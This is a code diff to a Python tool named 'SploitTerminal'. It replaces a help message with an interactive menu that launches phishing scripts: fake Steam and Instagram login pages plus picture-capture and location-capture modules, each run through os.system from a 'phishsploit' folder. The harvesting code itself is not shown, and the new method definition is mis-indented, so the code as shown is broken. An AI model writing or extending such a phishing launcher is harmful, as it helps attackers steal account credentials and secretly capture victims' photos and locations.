@@ -986,30 +986,89 @@ class SploitTerminal:
                 gui_dir = os.path.join(base_dir, "GUI")
                 self.open_directory(gui_dir)
 
-    def phishcapture(self):
+        def phishcapture(self):
         print("\n🎣 PhishCapture (Fake Pages)")
         print("=" * 50)
-        print("This feature requires the GUI application.")
-        print("Would you like to launch the GUI version?")
 
-        choice = input("Launch GUI? (y/n): ").lower().strip()
-        if choice == 'y':
-            self.launch_gui_application()
-        else:
-            print("ℹ️ You can manually run the GUI from the GUI/Application.py directory")
-            print("Available phishing modules:")
-            print("  - steam.py")
-            print("  - instagram.py")
-            print("  - Location.py")
-            print("  - take_picture.py")
+        while True:
+            print("\n📋 Select Phishing Page Type:")
+            print("1. Steam Phishing Page")
+            print("2. Instagram Phishing Page")
+            print("3. Picture Capture")
+            print("4. Location Capture")
+            print("5. Back to Main Menu")
+            print("=" * 30)
 
-            print(f"📟 Detected platform: {sys.platform} ({os.name})")
+            try:
+                choice = int(input("🎯 Enter your choice (1-5): ").strip())
 
-            open_dir = input("Open GUI directory? (y/n): ").lower().strip()
-            if open_dir == 'y':
+                if choice == 5:
+                    print("↩️ Returning to main menu...")
+                    break
+
+                # تعیین نام فایل بر اساس انتخاب کاربر
+                if choice == 1:
+                    script_name = "steam.py"
+                    page_name = "Steam"
+                elif choice == 2:
+                    script_name = "instagram.py"
+                    page_name = "Instagram"
+                elif choice == 3:
+                    script_name = "take_picture.py"
+                    page_name = "Picture Capture"
+                elif choice == 4:
+                    script_name = "location.py"
+                    page_name = "Location Capture"
+                else:
+                    print("❌ Invalid choice! Please try again.")
+                    continue
+
                 base_dir = os.path.dirname(os.path.abspath(__file__))
-                gui_dir = os.path.join(base_dir, "GUI")
-                self.open_directory(gui_dir)
+                phishing_dir = os.path.join(base_dir, "Windows", "phishsploit")
+                script_path = os.path.join(phishing_dir, script_name)
+
+                if not os.path.exists(script_path):
+                    print(f"❌ {page_name} phishing script not found!")
+                    print(f"📁 Expected path: {script_path}")
+
+                    if os.path.exists(phishing_dir):
+                        print(f"\n📂 Contents of {phishing_dir}:")
+                        for item in os.listdir(phishing_dir):
+                            item_path = os.path.join(phishing_dir, item)
+                            if os.path.isfile(item_path):
+                                print(f"  📄 {item}")
+                            else:
+                                print(f"  📁 {item}/")
+                    continue
+
+                print(f"🚀 Launching {page_name} phishing page...")
+                try:
+                    original_dir = os.getcwd()
+                    os.chdir(phishing_dir)
+
+                    if os.name == 'nt':  # Windows
+                        os.system(f'python "{script_name}"')
+                    else:  # Linux/Mac
+                        os.system(f'python3 "{script_name}"')
+
+                    os.chdir(original_dir)
+
+                    print(f"✅ {page_name} phishing page completed.")
+
+                except Exception as e:
+                    print(f"❌ Error launching {page_name}: {str(e)}")
+                    import traceback
+                    traceback.print_exc()
+
+                input("\nPress Enter to continue...")
+
+            except ValueError:
+                print("❌ Please enter a valid number!")
+            except KeyboardInterrupt:
+                print("\n↩️ Returning to main menu...")
+                break
+            except Exception as e:
+                print(f"❌ Unexpected error: {str(e)}")
 
 
     def phishcreator_ai(self):
